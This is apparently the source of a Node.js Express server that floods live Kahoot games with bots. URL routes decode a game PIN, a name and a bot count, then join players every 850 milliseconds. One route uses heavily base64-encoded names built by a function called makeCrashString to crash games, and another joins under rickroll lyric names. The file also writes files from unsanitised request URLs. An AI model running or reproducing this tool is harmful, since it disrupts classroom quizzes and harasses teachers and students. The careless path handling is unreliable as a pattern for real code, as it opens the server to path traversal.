var Kahoot = require("kahoot.js-latest");
var express = require("express");
var app = express();
var name;
var pin;
var bots;
var client;
var array2 = [];
var int;
var j;
var origin = "";
const path = require("path");
var fs = require("fs");
var directoryNameArray, folderName, fileNameArchive;
function makeFolder(directoryName) {
  directoryNameArray = directoryName.split("/");
  for (var i = 0; i < directoryNameArray.length; i++) {
    folderName = [];
    for (var j = 0; j <= i; j++) {
      folderName.push(directoryNameArray[j]);
      if (!fs.existsSync(folderName.join("/"))) {
        fs.mkdirSync(folderName.join("/"));
      }
    }
  }
}
function makeFile(fileName, fileContent) {
  fileName = fileName.split("/");
  fileNameArchive = fileName;
  fileName = [];
  for (var i = 0; i < fileNameArchive.length - 1; i++) {
    fileName[i] = fileNameArchive[i];
  }
  fileName = fileName.join("/");
  makeFolder(fileName);
  // Check if the file exists
  fs.writeFileSync(fileNameArchive.join("/"), fileContent);
}
function deleteFolder(folderPath){
  if (fs.existsSync(folderPath)) {
  fs.rm(folderPath, { recursive: true }, (err) => {
  if (err) {
    console.error(`Error cleaning files: ${err}`);
  } else {
    console.log('Files cleaned successfully');
  }
});
}
}
app.use(express.static("static"));
function addrandomChar(originalStr, char) {
  origin = originalStr;
  for (i = 0; i < 20 + Math.floor(Math.random() * 100); i++) {
    origin += char;
  }
  return origin;
}
function listenApp(theApp, array) {
  for (var i = 0; i < array.length; i++) {
    array2[i] = theApp;
    array2[i].listen(array[i], () => {
      console.log(`listening on port ` + array[i]);
    });
  }
}
function makeCrashString(str) {
  for (var i = 0; i < 20; i++) {
    str = btoa(str);
  }
  return str;
}
app.get("/:id1/:id2/:id3/:id4/flooder.html", (req, res) => {
  number = 1;
  number2 = 1;
  setInterval(kahoot, 850);
  function kahoot() {
    pin = atob(atob(req.params.id1));
    name = atob(atob(req.params.id2));
    bots = atob(atob(req.params.id3));
    client = new Kahoot();
    if (number <= parseInt(bots)) {
      client.join(pin, name + number++).catch((error) => {
        makeFile("static" + req.url.replace("/flooder.html", "") + "/status.txt", "error, " + error.description);
      });
      makeFile("static" + req.url.replace("/flooder.html", "") + "/percent.txt", (((number-1) / parseInt(bots)) * 100).toString());
      client.on("Joined", () => {
        makeFile("static" + req.url.replace("/flooder.html", "") + "/status.txt", "success, Successfully joined a bot!");
        number2++;
      });
    } else {
      deleteFolder("static/" + req.params.id1);
    }
    client.on("QuizEnd", () => {
      console.log("Game has ended. :(");
    });
  }
  res.sendFile(path.join(__dirname, "/backend/flooder.html"));
});
app.get("/die/:id1/flooder.html", (req, res) => {
  number = 1;
  number2 = 1;
  setInterval(kahoot, 850);
  function kahoot() {
    pin = atob(atob(req.params.id1));
    name = makeCrashString(Math.floor(Math.random() * 100000000).toString());
    bots = "100";
    client = new Kahoot();
    if (number <= parseInt(bots)) {
      client.join(pin, name + number++).catch((error) => {
        makeFile("static" + req.url.replace("/flooder.html", "") + "/status.txt", "error, " + error.description);
      });
      makeFile("static" + req.url.replace("/flooder.html", "") + "/percent.txt", (((number-1) / parseInt(bots)) * 100).toString());
      client.on("Joined", () => {
        makeFile("static" + req.url.replace("/flooder.html", "") + "/status.txt", "success, Successfully joined a bot!");
        number2++;
      });
    } else {
      deleteFolder("static/" + req.params.id1);
    }
    client.on("QuizEnd", () => {
      console.log("Game has ended.");
    });
  }
  res.sendFile(path.join(__dirname, "/backend/flooder.html"));
});
app.get("/lol/:id1/rickroll.html", (req, res) => {
  number = 1;
  number2 = 1;
  function joinPeople(array) {
    j = 0;
    int = setInterval(function () {
      pin = atob(atob(req.params.id1));
      name = array[j];
      bots = "100";
      client = new Kahoot();
      if (number <= parseInt(bots)) {
        client.join(pin, name).catch((error) => {
          console.log(error.description);
        });
        client.on("Joined", () => {
          console.log("Bots sent: " + number2++);
        });
      }
      client.on("QuizEnd", () => {
        console.log("Game has ended.");
      });
      j++;
      if (j == array.length) {
        clearInterval(int);
      }
    }, 850);
  }
  joinPeople([
    addrandomChar("Never gonna run around and dessert you", "ㅤ"),
    addrandomChar("Never gonna let you down", "ㅤ"),
    addrandomChar("Never gonna give you up", "ㅤ"),
  ]);
  res.sendFile(path.join(__dirname, "/backend/rickroll.html"));
});
app.all("/*", (req, res) => {
  res.status(404);
  res.set("Content-Type", "text/plain");
  res.send("404 Not Found");
});
listenApp(app, [8080, 8081, 8082, 8083, 8084, 8000, 3000, 9000, 7000]);
